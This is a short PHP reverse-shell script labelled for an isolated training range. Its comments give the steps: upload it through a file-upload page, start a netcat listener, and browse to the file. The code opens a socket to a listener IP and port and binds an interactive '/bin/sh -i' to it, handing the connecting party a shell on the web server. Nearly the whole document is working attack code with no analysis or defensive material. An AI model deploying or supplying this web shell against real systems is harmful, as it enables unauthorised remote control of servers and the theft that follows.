<?php
// LAB REVERSE SHELL for the Breach Range only. Edit $ip/$port to your listener,
// upload via upload.php, start a listener (nc -lvnp 4444), then browse to
// /uploads/revshell.php to catch the shell. Isolated lab use only.
set_time_limit(0);
$ip   = '127.0.0.1';   // <-- your listener IP (the host running netcat)
$port = 4444;          // <-- your listener port
$sock = @fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) { die("connect failed: $errstr ($errno)\n"); }
$desc = [0 => $sock, 1 => $sock, 2 => $sock];
$proc = proc_open('/bin/sh -i', $desc, $pipes);
if (is_resource($proc)) {
    while (!feof($sock)) { /* keep the session open */ usleep(100000); }
    proc_close($proc);
}
